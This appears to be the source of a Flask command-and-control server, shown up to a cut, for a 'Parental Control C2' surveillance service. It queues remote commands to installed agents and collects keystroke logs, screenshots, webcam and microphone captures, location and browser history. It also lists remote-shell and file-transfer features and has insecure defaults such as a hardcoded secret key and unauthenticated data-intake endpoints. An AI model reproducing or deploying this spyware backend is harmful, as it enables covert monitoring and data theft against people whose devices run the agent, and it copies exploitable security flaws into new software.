"""
🔥 PARENTAL CONTROL C2 - ENHANCED SERVER
Complete API and Dashboard
"""
from flask import Flask, render_template, request, jsonify, redirect, url_for, session, flash, send_file
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_login import LoginManager, login_user, logout_user, login_required, current_user, UserMixin
import time, json, hashlib, datetime, os, base64, io
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime, timedelta
import pymongo
from bson.objectid import ObjectId
from config import MONGODB_URI
from functools import wraps
import pandas as pd
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
from io import BytesIO
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import schedule
import threading

app = Flask(__name__)
app.config['SECRET_KEY'] = 'super-secret-key-change-in-production-2026-enhanced'
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB max upload
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', max_http_buffer_size=10000000)

# MongoDB Connection
mongo_client = pymongo.MongoClient(MONGODB_URI)
db = mongo_client['ParentalControlC2']

# Collections
pending_pcs = db.pending_pcs
pcs = db.pcs
parents = db.parents
admins = db.admins
commands = db.commands
alerts = db.alerts
screenshots = db.screenshots
keylogs = db.keylogs
locations = db.locations
app_usage = db.app_usage
browser_history = db.browser_history
social_media_logs = db.social_media_logs
system_stats = db.system_stats
reports = db.reports
user_profiles = db.user_profiles
blocked_sites = db.blocked_sites
blocked_apps = db.blocked_apps
time_restrictions = db.time_restrictions
geofence_settings = db.geofence_settings
keyword_alerts_log = db.keyword_alerts_log
motion_detections = db.motion_detections

# Login Manager
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'parent_login'

class User(UserMixin):
    def __init__(self, id, email, role):
        self.id = id
        self.email = email
        self.role = role

@login_manager.user_loader
def load_user(user_id):
    try:
        oid = ObjectId(user_id)
    except:
        return None
    
    admin = admins.find_one({'_id': oid})
    if admin:
        return User(str(admin['_id']), admin['email'], 'admin')
    
    parent = parents.find_one({'_id': oid})
    if parent:
        return User(str(parent['_id']), parent['email'], 'parent')
    
    return None

# Role-based access control
def admin_required(f):
    @wraps(f)
    @login_required
    def decorated_function(*args, **kwargs):
        if current_user.role != 'admin':
            flash('Admin access required', 'danger')
            return redirect(url_for('parent_dashboard'))
        return f(*args, **kwargs)
    return decorated_function

def parent_required(f):
    @wraps(f)
    @login_required
    def decorated_function(*args, **kwargs):
        if current_user.role != 'parent':
            flash('Parent access required', 'danger')
            return redirect(url_for('admin_dashboard'))
        return f(*args, **kwargs)
    return decorated_function

# ============ AUTHENTICATION ROUTES ============

@app.route('/')
def index():
    if current_user.is_authenticated:
        if current_user.role == 'admin':
            return redirect(url_for('admin_dashboard'))
        return redirect(url_for('parent_dashboard'))
    return redirect(url_for('parent_login'))

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if current_user.is_authenticated and current_user.role == 'admin':
        return redirect(url_for('admin_dashboard'))
    
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        totp_code = request.form.get('totp_code')  # Two-factor auth
        
        admin = admins.find_one({'email': email})
        if admin and check_password_hash(admin['password'], password):
            # TODO: Verify TOTP code for 2FA
            user = User(str(admin['_id']), email, 'admin')
            login_user(user)
            return redirect(url_for('admin_dashboard'))
        
        flash('Invalid credentials', 'danger')
    
    return render_template('admin_login.html')

@app.route('/parent/login', methods=['GET', 'POST'])
def parent_login():
    if current_user.is_authenticated:
        if current_user.role == 'parent':
            return redirect(url_for('parent_dashboard'))
        return redirect(url_for('admin_dashboard'))
    
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        
        parent = parents.find_one({'email': email})
        if parent and check_password_hash(parent['password'], password):
            user = User(str(parent['_id']), email, 'parent')
            login_user(user)
            return redirect(url_for('parent_dashboard'))
        
        flash('Invalid email or password', 'danger')
    
    return render_template('parent_login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('parent_login'))

# ============ ADMIN ROUTES ============

@app.route('/admin/dashboard')
@admin_required
def admin_dashboard():
    pending = list(pending_pcs.find().sort('first_seen', -1))
    
    parent_groups = []
    for parent in parents.find():
        pid_str = str(parent['_id'])
        parent_pcs = list(pcs.find({'parent_id': pid_str}))
        parent_groups.append({
            'parent_id': pid_str,
            'parent_email': parent['email'],
            'pcs': parent_pcs,
            'subscription': parent.get('subscription', {})
        })
    
    stats = {
        'total_parents': parents.count_documents({}),
        'total_pcs': pcs.count_documents({}),
        'pending_pcs': pending_pcs.count_documents({}),
        'active_pcs': pcs.count_documents({'last_seen': {'$gte': time.time() - 300}})
    }
    
    return render_template('admin_dashboard.html', 
                         pending_pcs=pending, 
                         parent_groups=parent_groups,
                         stats=stats)

@app.route('/assign_pc', methods=['POST'])
@admin_required
def assign_pc():
    data = request.json
    pc_id = data.get('pc_id')
    parent_id = data.get('parent_id')
    
    parent = parents.find_one({'_id': ObjectId(parent_id)})
    if not parent:
        return jsonify({'error': 'Parent not found'}), 404
    
    sub = parent.get('subscription', {'limit': 0})
    current_count = pcs.count_documents({'parent_id': parent_id})
    
    if current_count >= sub['limit']:
        return jsonify({'error': f"Subscription limit reached ({sub['limit']} devices)"}), 400
    
    pc = pending_pcs.find_one({'pc_id': pc_id})
    if pc:
        pc['parent_id'] = parent_id
        pc['assigned_at'] = time.time()
        pcs.insert_one(pc)
        pending_pcs.delete_one({'pc_id': pc_id})
        
        socketio.emit('pc_assigned', {'pc_id': pc_id, 'parent_id': parent_id})
        
        return jsonify({'status': 'assigned', 'pc_id': pc_id})
    
    return jsonify({'error': 'PC not found'}), 404

@app.route('/admin/create_parent', methods=['POST'])
@admin_required
def create_parent():
    data = request.json
    email = data.get('email')
    password = generate_password_hash(data.get('password'))
    plan = data.get('plan', 'free')
    
    if parents.find_one({'email': email}):
        return jsonify({'error': 'Email already exists'}), 400
    
    subscription = {
        'plan': plan,
        'limit': 0 if plan == 'free' else (1 if plan == 'basic' else 2),
        'expiry': time.time() + (30 * 24 * 60 * 60) if plan != 'free' else 0
    }
    
    parent_id = parents.insert_one({
        'email': email,
        'password': password,
        'created_at': time.time(),
        'subscription': subscription
    }).inserted_id
    
    return jsonify({'status': 'created', 'parent_id': str(parent_id)})

# ============ PARENT ROUTES ============

@app.route('/parent/dashboard')
@parent_required
def parent_dashboard():
    parent_id = current_user.id
    my_pcs = list(pcs.find({'parent_id': parent_id}).sort('last_seen', -1))
    
    # Get subscription info
    parent = parents.find_one({'_id': ObjectId(parent_id)})
    sub = parent.get('subscription', {'plan': 'Free', 'limit': 0, 'expiry': 0})
    
    # Get recent alerts
    recent_alerts = list(alerts.find({'parent_id': parent_id}).sort('timestamp', -1).limit(10))
    
    # Calculate stats
    stats = {
        'active_devices': len([pc for pc in my_pcs if pc.get('last_seen', 0) > time.time() - 300]),
        'total_alerts': alerts.count_documents({'parent_id': parent_id, 'timestamp': {'$gte': time.time() - 86400}}),
        'blocked_attempts': sum([pc.get('blocked_attempts', 0) for pc in my_pcs])
    }
    
    return render_template('parent_dashboard.html', 
                         pcs=my_pcs, 
                         now=time.time(), 
                         sub=sub,
                         alerts=recent_alerts,
                         stats=stats)

@app.route('/parent/pc/<pc_id>')
@parent_required
def pc_control(pc_id):
    pc = pcs.find_one({'pc_id': pc_id, 'parent_id': current_user.id})
    if not pc:
        flash('PC not found or access denied', 'danger')
        return redirect(url_for('parent_dashboard'))
    
    # Get recent data
    recent_screenshots = list(screenshots.find({'pc_id': pc_id}).sort('timestamp', -1).limit(20))
    recent_keylogs = list(keylogs.find({'pc_id': pc_id}).sort('timestamp', -1).limit(100))
    app_usage_data = list(app_usage.find({'pc_id': pc_id}).sort('timestamp', -1).limit(1))
    
    return render_template('pc_control.html', 
                         pc=pc,
                         screenshots=recent_screenshots,
                         keylogs=recent_keylogs,
                         app_usage=app_usage_data[0] if app_usage_data else {})

@app.route('/parent/subscribe', methods=['POST'])
@parent_required
def parent_subscribe():
    data = request.json
    plan_type = data.get('plan')
    
    expiry = time.time() + (30 * 24 * 60 * 60)  # 30 days
    
    if plan_type == 'basic':
        sub = {'plan': 'Basic (1 Device)', 'limit': 1, 'expiry': expiry, 'price': 200}
    elif plan_type == 'pro':
        sub = {'plan': 'Pro (2 Devices)', 'limit': 2, 'expiry': expiry, 'price': 400}
    else:
        sub = {'plan': 'Free', 'limit': 1, 'expiry': 0, 'price': 0}
    
    parents.update_one({'_id': ObjectId(current_user.id)}, {'$set': {'subscription': sub}})
    
    return jsonify({'success': True, 'plan': sub['plan']})

@app.route('/parent/cancel_subscription', methods=['POST'])
@parent_required
def cancel_subscription():
    parents.update_one({'_id': ObjectId(current_user.id)}, {'$set': {'subscription': {'plan': 'Free', 'limit': 0, 'expiry': 0}}})
    return jsonify({'success': True, 'message': 'Subscription cancelled'})

@app.route('/parent/subscription')
@parent_required
def parent_subscription():
    parent = parents.find_one({'_id': ObjectId(current_user.id)})
    sub = parent.get('subscription', {'plan': 'Free', 'limit': 0, 'expiry': 0})
    
    # Count devices
    devices_count = pcs.count_documents({'parent_id': current_user.id})
    
    # Get billing history (placeholder)
    billing_history = []
    
    return render_template('parent_subscription.html', 
                         sub=sub, 
                         devices_count=devices_count,
                         billing_history=billing_history)

@app.route('/parent/monitoring')
@parent_required
def parent_monitoring():
    parent_id = current_user.id
    my_pcs = list(pcs.find({'parent_id': parent_id}).sort('last_seen', -1))
    
    # Format last_seen time
    for pc in my_pcs:
        last_seen = pc.get('last_seen', time.time())
        if time.time() - last_seen < 60:
            pc['last_seen_formatted'] = 'Just now'
        elif time.time() - last_seen < 3600:
            minutes = int((time.time() - last_seen) / 60)
            pc['last_seen_formatted'] = f'{minutes}m ago'
        else:
            pc['last_seen_formatted'] = datetime.fromtimestamp(last_seen).strftime('%m/%d %H:%M')
    
    # Count stats
    online_count = len([pc for pc in my_pcs if time.time() - pc.get('last_seen', 0) < 120])
    alerts_count = alerts.count_documents({'parent_id': parent_id, 'timestamp': {'$gte': time.time() - 86400}})
    blocked_attempts = sum([pc.get('blocked_attempts', 0) for pc in my_pcs])
    
    return render_template('parent_monitoring.html',
                         pcs=my_pcs,
                         now=time.time(),
                         online_count=online_count,
                         alerts_count=alerts_count,
                         blocked_attempts=blocked_attempts)

@app.route('/parent/reports')
@parent_required
def parent_reports():
    parent_id = current_user.id
    my_pcs = list(pcs.find({'parent_id': parent_id}))
    
    # Get last 7 days of reports
    reports_data = list(reports.find({'parent_id': parent_id, 'timestamp': {'$gte': time.time() - (7*86400)}}))
    
    return render_template('parent_reports.html',
                         reports=reports_data,
                         pcs=my_pcs)

@app.route('/parent/settings')
@parent_required
def parent_settings():
    parent = parents.find_one({'_id': ObjectId(current_user.id)})
    
    return render_template('parent_settings.html',
                         parent=parent)

# ============ PC REGISTRATION & HEARTBEAT ============

@app.route('/register_pending_pc', methods=['POST'])
def register_pending_pc():
    pc_data = request.json
    pc_id = pc_data.get('pc_id')
    now = time.time()
    
    pc_data['last_seen'] = now
    
    # Check if already active
    if pcs.find_one({'pc_id': pc_id}):
        pcs.update_one({'pc_id': pc_id}, {'$set': {'last_seen': now}})
        return jsonify({'status': 'registered', 'info': 'already_active'})
    
    # Add to pending or update
    existing = pending_pcs.find_one({'pc_id': pc_id})
    if existing:
        pending_pcs.update_one({'pc_id': pc_id}, {'$set': pc_data})
    else:
        pending_pcs.insert_one(pc_data)
    
    return jsonify({'status': 'registered'})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    pc_data = request.json
    pc_id = pc_data.get('pc_id')
    now = time.time()
    
    # Update last seen
    pcs.update_one({'pc_id': pc_id}, {'$set': {'last_seen': now}})
    pending_pcs.update_one({'pc_id': pc_id}, {'$set': {'last_seen': now}})
    
    # Store system stats
    if 'system_stats' in pc_data:
        system_stats.insert_one({
            'pc_id': pc_id,
            'stats': pc_data['system_stats'],
            'timestamp': now
        })
    
    # Store keystrokes
    if 'keystrokes' in pc_data and pc_data['keystrokes']:
        keylogs.insert_one({
            'pc_id': pc_id,
            'data': pc_data['keystrokes'],
            'window': pc_data.get('active_window'),
            'timestamp': now
        })
    
    # Emit real-time update
    socketio.emit('pc_update', pc_data, room=pc_id)
    
    # Check for pending commands
    pending_cmd = commands.find_one_and_delete({'pc_id': pc_id})
    if pending_cmd:
        return jsonify({
            'status': 'ok',
            'command': pending_cmd['command'],
            'payload': pending_cmd.get('payload')
        })
    
    return jsonify({'status': 'ok'})

# ============ COMMAND EXECUTION ============

@app.route('/api/send_command', methods=['POST'])
@parent_required
def send_command():
    data = request.json
    pc_id = data.get('pc_id')
    command = data.get('command')
    payload = data.get('payload')
    
    # Security: Verify parent owns this PC
    pc = pcs.find_one({'pc_id': pc_id, 'parent_id': current_user.id})
    if not pc:
        return jsonify({'error': 'Unauthorized'}), 403
    
    commands.insert_one({
        'pc_id': pc_id,
        'command': command,
        'payload': payload,
        'created_at': time.time(),
        'parent_id': current_user.id
    })
    
    # Log command
    alerts.insert_one({
        'pc_id': pc_id,
        'parent_id': current_user.id,
        'type': 'command',
        'message': f"Command sent: {command}",
        'timestamp': time.time()
    })
    
    return jsonify({'status': 'queued', 'command': command})

@app.route('/api/command_result', methods=['POST'])
def command_result():
    data = request.json
    pc_id = data.get('pc_id')
    result = data.get('result')
    
    # Store result based on type
    if 'screenshot' in result:
        screenshots.insert_one({
            'pc_id': pc_id,
            'data': result['screenshot']['data'],
            'window': result['screenshot'].get('window'),
            'timestamp': result['screenshot']['timestamp']
        })
        
        # Update PC record with latest screenshot
        pcs.update_one({'pc_id': pc_id}, {'$set': {'last_screenshot': result['screenshot']['data']}})
    
    if 'webcam' in result:
        pcs.update_one({'pc_id': pc_id}, {'$set': {'last_webcam': result['webcam']}})
    
    if 'webcam_stream' in result:
        socketio.emit('webcam_stream', result, room=pc_id)
        
        if result.get('motion_detected'):
            motion_detections.insert_one({
                'pc_id': pc_id,
                'timestamp': time.time()
            })
    
    if 'mic_recording' in result:
        pcs.update_one({'pc_id': pc_id}, {'$set': {'last_mic_recording': result['mic_recording']}})
    
    if 'location' in result:
        locations.insert_one({
            'pc_id': pc_id,
            'location': result['location'],
            'timestamp': time.time()
        })
    
    if 'app_usage' in result:
        app_usage.insert_one({
            'pc_id': pc_id,
            'usage': result['app_usage'],
            'timestamp': time.time()
        })
    
    if 'browser_history' in result:
        browser_history.insert_one({
            'pc_id': pc_id,
            'history': result['browser_history'],
            'timestamp': time.time()
        })
    
    if 'system_stats' in result:
        system_stats.insert_one({
            'pc_id': pc_id,
            'stats': result['system_stats'],
            'timestamp': time.time()
        })
    
    # Emit to real-time listeners
    socketio.emit('command_result', {'pc_id': pc_id, 'result': result}, room=pc_id)
    
    return jsonify({'status': 'received'})

@app.route('/api/alert', methods=['POST'])
def receive_alert():
    data = request.json
    pc_id = data.get('pc_id')
    message = data.get('message')
    timestamp = data.get('timestamp')
    
    # Find parent of this PC
    pc = pcs.find_one({'pc_id': pc_id})
    if pc:
        parent_id = pc.get('parent_id')
        
        alerts.insert_one({
            'pc_id': pc_id,
            'parent_id': parent_id,
            'type': 'alert',
            'message': message,
            'timestamp': timestamp,
            'read': False
        })
        
        # Emit real-time alert
        socketio.emit('new_alert', {
            'pc_id': pc_id,
            'message': message,
            'timestamp': timestamp
        }, room=f"parent_{parent_id}")
        
        # TODO: Send push notification, email, etc.
    
    return jsonify({'status': 'received'})

# ============ DATA RETRIEVAL APIs ============

@app.route('/api/pc_data/<pc_id>')
@parent_required
def get_pc_data(pc_id):
    pc = pcs.find_one({'pc_id': pc_id, 'parent_id': current_user.id})
    if not pc:
        return jsonify({'error': 'Unauthorized'}), 403
    
    data = {
        'pc_id': pc_id,
        'last_seen': pc.get('last_seen'),
        'screenshot': pc.get('last_screenshot'),
        'webcam': pc.get('last_webcam'),
        'system_stats': pc.get('system_stats'),
        'active_window': pc.get('active_window')
    }
    
    return jsonify(data)

@app.route('/api/screenshots/<pc_id>')
@parent_required
def get_screenshots(pc_id):
    pc = pcs.find_one({'pc_id': pc_id, 'parent_id': current_user.id})
    if not pc:
        return jsonify({'error': 'Unauthorized'}), 403
    
    limit = int(request.args.get('limit', 20))
    screenshots_data = list(screenshots.find({'pc_id': pc_id}).sort('timestamp', -1).limit(limit))
    
    # Convert ObjectId to string
    for s in screenshots_data:
        s['_id'] = str(s['_id'])
    
    return jsonify(screenshots_data)

@app.route('/api/keylogs/<pc_id>')
@parent_required
def get_keylogs(pc_id):
    pc = pcs.find_one({'pc_id': pc_id, 'parent_id': current_user.id})
    if not pc:
        return jsonify({'error': 'Unauthorized'}), 403
    
    limit = int(request.args.get('limit', 100))
    keylogs_data = list(keylogs.find({'pc_id': pc_id}).sort('timestamp', -1).limit(limit))
    
    for k in keylogs_data:
        k['_id'] = str(k['_id'])
    
    return jsonify(keylogs_data)

@app.route('/api/app_usage/<pc_id>')
@parent_required
def get_app_usage(pc_id):
    pc = pcs.find_one({'pc_id': pc_id, 'parent_id': current_user.id})
    if not pc:
        return jsonify({'error': 'Unauthorized'}), 403
    
    # Get last 24 hours
    since = time.time() - 86400
    usage_data = list(app_usage.find({
        'pc_id': pc_id,
        'timestamp': {'$gte': since}
    }).sort('timestamp', -1))
    
    return jsonify(usage_data)

@app.route('/api/locations/<pc_id>')
@parent_required
def get_locations(pc_id):
    pc = pcs.find_one({'pc_id': pc_id, 'parent_id': current_user.id})
    if not pc:
        return jsonify({'error': 'Unauthorized'}), 403
    
    locations_data = list(locations.find({'pc_id': pc_id}).sort('timestamp', -1).limit(50))
    
    for loc in locations_data:
        loc['_id'] = str(loc['_id'])
    
    return jsonify(locations_data)

@app.route('/api/system_stats/<pc_id>')
@parent_required
def get_system_stats(pc_id):
    pc = pcs.find_one({'pc_id': pc_id, 'parent_id': current_user.id})
    if not pc:
        return jsonify({'error': 'Unauthorized'}), 403
    
    # Get last 1 hour of stats
    since = time.time() - 3600
    stats_data = list(system_stats.find({
        'pc_id': pc_id,
        'timestamp': {'$gte': since}
    }).sort('timestamp', -1))
    
    return jsonify(stats_data)

@app.route('/api/alerts/<pc_id>')
@parent_required
def get_alerts(pc_id):
    pc = pcs.find_one({'pc_id': pc_id, 'parent_id': current_user.id})
    if not pc:
        return jsonify({'error': 'Unauthorized'}), 403
    
    alerts_data = list(alerts.find({
        'pc_id': pc_id,
        'parent_id': current_user.id
    }).sort('timestamp', -1).limit(50))
    
    for a in alerts_data:
        a['_id'] = str(a['_id'])
    
    return jsonify(alerts_data)

# ============ BLOCKING & RESTRICTIONS ============

@app.route('/api/block_website', methods=['POST'])
@parent_required
def block_website():
    data = request.json
    pc_id = data.get('pc_id')
    website = data.get('website')
    
    pc = pcs.find_one({'pc_id': pc_id, 'parent_id': current_user.id})
    if not pc:
        return jsonify({'error': 'Unauthorized'}), 403
    
    blocked_sites.insert_one({
        'pc_id': pc_id,
        'parent_id': current_user.id,
        'website': website,
        'timestamp': time.time()
    })
    
    # Send command to client
    commands.insert_one({
        'pc_id': pc_id,
        'command': 'block_website',
        'payload': website,
        'created_at': time.time()
    })
    
    return jsonify({'status': 'blocked', 'website': website})

@app.route('/api/block_app', methods=['POST'])
@parent_required
def block_app():
    data = request.json
    pc_id = data.get('pc_id')
    app_name = data.get('app_name')
    
    pc = pcs.find_one({'pc_id': pc_id, 'parent_id': current_user.id})
    if not pc:
        return jsonify({'error': 'Unauthorized'}), 403
    
    blocked_apps.insert_one({
        'pc_id': pc_id,
        'parent_id': current_user.id,
        'app_name': app_name,
        'timestamp': time.time()
    })
    
    commands.insert_one({
        'pc_id': pc_id,
        'command': 'block_app',
        'payload': app_name,
        'created_at': time.time()
    })
    
    return jsonify({'status': 'blocked', 'app': app_name})

@app.route('/api/set_time_limit', methods=['POST'])
@parent_required
def set_time_limit():
    data = request.json
    pc_id = data.get('pc_id')
    daily_limit = data.get('daily_limit')  # in minutes
    
    pc = pcs.find_one({'pc_id': pc_id, 'parent_id': current_user.id})
    if not pc:
        return jsonify({'error': 'Unauthorized'}), 403
    
    time_restrictions.update_one(
        {'pc_id': pc_id},
        {'$set': {
            'parent_id': current_user.id,
            'daily_limit': daily_limit,
            'updated_at': time.time()
        }},
        upsert=True
    )
    
    return jsonify({'status': 'set', 'daily_limit': daily_limit})

@app.route('/api/set_geofence', methods=['POST'])
@parent_required
def set_geofence():
    data = request.json
    pc_id = data.get('pc_id')
    lat = data.get('lat')
    lon = data.get('lon')
    radius = data.get('radius', 1)  # km
    
    pc = pcs.find_one({'pc_id': pc_id, 'parent_id': current_user.id})
    if not pc:
        return jsonify({'error': 'Unauthorized'}), 403
    
    geofence_settings.update_one(
        {'pc_id': pc_id},
        {'$set': {
            'parent_id': current_user.id,
            'lat': lat,
            'lon': lon,
            'radius': radius,
            'updated_at': time.time()
        }},
        upsert=True
    )
    
    return jsonify({'status': 'set', 'geofence': {'lat': lat, 'lon': lon, 'radius': radius}})

# ============ REPORTING ============

@app.route('/api/generate_report/<pc_id>')
@parent_required
def generate_report(pc_id):
    pc = pcs.find_one({'pc_id': pc_id, 'parent_id': current_user.id})
    if not pc:
        return jsonify({'error': 'Unauthorized'}), 403
    
    # Generate daily activity report
    since = time.time() - 86400  # Last 24 hours
    
    report_data = {
        'pc_id': pc_id,
        'pc_name': pc.get('pc_name'),
        'generated_at': time.time(),
        'period': '24 hours',
        'screenshots_count': screenshots.count_documents({'pc_id': pc_id, 'timestamp': {'$gte': since}}),
        'keystrokes_count': keylogs.count_documents({'pc_id': pc_id, 'timestamp': {'$gte': since}}),
        'alerts_count': alerts.count_documents({'pc_id': pc_id, 'timestamp': {'$gte': since}}),
        'app_usage': list(app_usage.find({'pc_id': pc_id, 'timestamp': {'$gte': since}})),
        'browser_history': list(browser_history.find({'pc_id': pc_id, 'timestamp': {'$gte': since}})),
        'locations': list(locations.find({'pc_id': pc_id, 'timestamp': {'$gte': since}}))
    }
    
    # Store report
    report_id = reports.insert_one(report_data).inserted_id
    
    return jsonify({'status': 'generated', 'report_id': str(report_id), 'data': report_data})

@app.route('/api/export_report_pdf/<report_id>')
@parent_required
def export_report_pdf(report_id):
    report = reports.find_one({'_id': ObjectId(report_id)})
    if not report:
        return jsonify({'error': 'Report not found'}), 404
    
    # Create PDF
    buffer = BytesIO()
    pdf = canvas.Canvas(buffer, pagesize=letter)
    
    pdf.setTitle(f"Activity Report - {report['pc_name']}")
    pdf.drawString(100, 750, f"Activity Report - {report['pc_name']}")
    pdf.drawString(100, 730, f"Generated: {datetime.fromtimestamp(report['generated_at']).strftime('%Y-%m-%d %H:%M:%S')}")
    pdf.drawString(100, 710, f"Period: {report['period']}")
    pdf.drawString(100, 680, f"Screenshots: {report['screenshots_count']}")
    pdf.drawString(100, 660, f"Keystrokes: {report['keystrokes_count']}")
    pdf.drawString(100, 640, f"Alerts: {report['alerts_count']}")
    
    pdf.save()
    
    buffer.seek(0)
    return send_file(buffer, as_attachment=True, download_name=f"report_{report_id}.pdf", mimetype='application/pdf')

# ============ WEBSOCKET EVENTS ============

@socketio.on('connect')
def handle_connect():
    if current_user.is_authenticated:
        if current_user.role == 'parent':
            join_room(f"parent_{current_user.id}")
        emit('connected', {'status': 'connected'})

@socketio.on('disconnect')
def handle_disconnect():
    if current_user.is_authenticated:
        if current_user.role == 'parent':
            leave_room(f"parent_{current_user.id}")

@socketio.on('join_pc_room')
def handle_join_pc_room(data):
    if current_user.is_authenticated and current_user.role == 'parent':
        pc_id = data.get('pc_id')
        pc = pcs.find_one({'pc_id': pc_id, 'parent_id': current_user.id})
        if pc:
            join_room(pc_id)
            emit('joined_room', {'pc_id': pc_id})

@socketio.on('leave_pc_room')
def handle_leave_pc_room(data):
    if current_user.is_authenticated:
        pc_id = data.get('pc_id')
        leave_room(pc_id)
        emit('left_room', {'pc_id': pc_id})

# ============ BACKGROUND TASKS ============

def cleanup_old_data():
    """Clean up old data to save storage"""
    cutoff = time.time() - (30 * 24 * 60 * 60)  # 30 days old
    
    screenshots.delete_many({'timestamp': {'$lt': cutoff}})
    keylogs.delete_many({'timestamp': {'$lt': cutoff}})
    system_stats.delete_many({'timestamp': {'$lt': cutoff}})
    
    print("Cleaned up old data")

def generate_daily_reports():
    """Generate daily reports for all PCs"""
    for pc in pcs.find():
        try:
            # Generate report logic
            pass
        except Exception as e:
            print(f"Report generation error: {e}")

# Schedule background tasks
def run_scheduler():
    schedule.every().day.at("02:00").do(cleanup_old_data)
    schedule.every().day.at("06:00").do(generate_daily_reports)
    
    while True:
        schedule.run_pending()
        time.sleep(3600)

# Start scheduler in background
threading.Thread(target=run_scheduler, daemon=True).start()

# ============ UTILITY ROUTES ============

@app.route('/health')
def health():
    return jsonify({
        'status': 'alive',
        'service': 'ParentalControlC2-Enhanced',
        'version': '3.0',
        'timestamp': time.time()
    })

@app.route('/api/config')
def get_config():
    return jsonify({
        'server_ip': request.host,
        'features': [
            'screenshot', 'webcam', 'keylog', 'mic_recording',
            'location', 'app_usage', 'browser_history', 'social_media',
            'remote_control', 'blocking', 'time_limits', 'geofencing',
            'alerts', 'reports', 'live_stream', 'audio_monitor', 'process_control',
            'remote_shell', 'file_transfer', 'system_stats', 'behavior_analysis'
        ],
        'version': '3.0'
    })

# ============ ADVANCED MONITORING ENDPOINTS ============

@app.route('/api/upload_result', methods=['POST'])
def upload_result():
    """Receive data from client"""
    data = request.json
    pc_id = data.get('pc_id')
    
    if 'screenshot' in data:
        pcs.update_one({'pc_id': pc_id}, {'$set': {'last_screenshot': data['screenshot'], 'last_seen': time.time()}})
    
    if 'webcam' in data:
        pcs.update_one({'pc_id': pc_id}, {'$set': {'last_webcam': data['webcam']}})
    
    if 'audio' in data:
        pcs.update_one({'pc_id': pc_id}, {'$set': {'last_audio': data['audio']}})
    
    if 'app_usage' in data:
        app_usage.insert_one({'pc_id': pc_id, 'data': data['app_usage'], 'timestamp': time.time()})
    
    if 'processes' in data:
        pcs.update_one({'pc_id': pc_id}, {'$set': {'last_processes': data['processes']}})
    
    if 'location' in data:
        locations.insert_one({'pc_id': pc_id, 'data': data['location'], 'timestamp': time.time()})
    
    if 'alert' in data:
        alerts.insert_one({'pc_id': pc_id, 'message': data['alert'], 'timestamp': time.time()})
    
    if 'stats' in data:
        system_stats.insert_one({'pc_id': pc_id, 'data': data['stats'], 'timestamp': time.time()})
    
    if 'command_output' in data:
        pcs.update_one({'pc_id': pc_id}, {'$set': {'last_command_output': data['command_output']}})
    
    if 'history' in data:
        pcs.update_one({'pc_id': pc_id}, 
                      {'$push': {'window_history': {'$each': [data['history']], '$slice': -50}}})
    
    return jsonify({'status': 'received'})

@app.route('/api/get_stats/<pc_id>')
@parent_required
def get_stats(pc_id):
    """Get system statistics"""
    pc = pcs.find_one({'pc_id': pc_id, 'parent_id': current_user.id})
    if not pc:
        return jsonify({'error': 'Not found'}), 404
    
    stats_data = list(system_stats.find({'pc_id': pc_id}).sort('timestamp', -1).limit(24))
    return jsonify({'stats': stats_data})

@app.route('/api/get_app_usage/<pc_id>')
@parent_required
def get_app_usage_advanced(pc_id):
    """Get advanced app usage statistics (last 7 days)"""
    pc = pcs.find_one({'pc_id': pc_id, 'parent_id': current_user.id})
    if not pc:
        return jsonify({'error': 'Not found'}), 404
    since = time.time() - 7*86400
    usage_data = list(app_usage.find({'pc_id': pc_id, 'timestamp': {'$gte': since}}).sort('timestamp', -1))
    return jsonify({'usage': usage_data})

@app.route('/api/get_locations/<pc_id>')
@parent_required
def get_locations_advanced(pc_id):
    """Get advanced location history (last 7 days)"""
    pc = pcs.find_one({'pc_id': pc_id, 'parent_id': current_user.id})
    if not pc:
        return jsonify({'error': 'Not found'}), 404
    since = time.time() - 7*86400
    loc_data = list(locations.find({'pc_id': pc_id, 'timestamp': {'$gte': since}}).sort('timestamp', -1))
    return jsonify({'locations': loc_data})

@app.route('/api/get_alerts/<pc_id>')
@parent_required
def get_alerts_advanced(pc_id):
    """Get advanced alerts (last 7 days)"""
    pc = pcs.find_one({'pc_id': pc_id, 'parent_id': current_user.id})
    if not pc:
        return jsonify({'error': 'Not found'}), 404
    since = time.time() - 7*86400
    alerts_data = list(alerts.find({'pc_id': pc_id, 'timestamp': {'$gte': since}}).sort('timestamp', -1))
    return jsonify({'alerts': alerts_data})

@app.route('/api/block_site', methods=['POST'])
@parent_required
def block_site():
    """Send website block command"""
    data = request.json
    pc = pcs.find_one({'pc_id': data['pc_id'], 'parent_id': current_user.id})
    if not pc:
        return jsonify({'error': 'Unauthorized'}), 403
    
    commands.insert_one({
        'pc_id': data['pc_id'],
        'command': 'block_site',
        'payload': data.get('url'),
        'created_at': time.time()
    })
    return jsonify({'status': 'queued'})

@app.route('/api/unblock_site', methods=['POST'])
@parent_required
def unblock_site():
    """Send website unblock command"""
    data = request.json
    pc = pcs.find_one({'pc_id': data['pc_id'], 'parent_id': current_user.id})
    if not pc:
        return jsonify({'error': 'Unauthorized'}), 403
    
    commands.insert_one({
        'pc_id': data['pc_id'],
        'command': 'unblock_site',
        'payload': data.get('url'),
        'created_at': time.time()
    })
    return jsonify({'status': 'queued'})

@app.route('/api/block_app_advanced', methods=['POST'])
@parent_required
def block_app_advanced():
    """Block application (advanced)"""
    data = request.json
    pc = pcs.find_one({'pc_id': data['pc_id'], 'parent_id': current_user.id})
    if not pc:
        return jsonify({'error': 'Unauthorized'}), 403
    commands.insert_one({
        'pc_id': data['pc_id'],
        'command': 'block_app',
        'payload': data.get('app_name'),
        'created_at': time.time()
    })
    return jsonify({'status': 'queued'})

@app.route('/api/kill_process/<pc_id>/<int:pid>', methods=['POST'])
@parent_required
def kill_process(pc_id, pid):
    """Kill running process"""
    pc = pcs.find_one({'pc_id': pc_id, 'parent_id': current_user.id})
    if not pc:
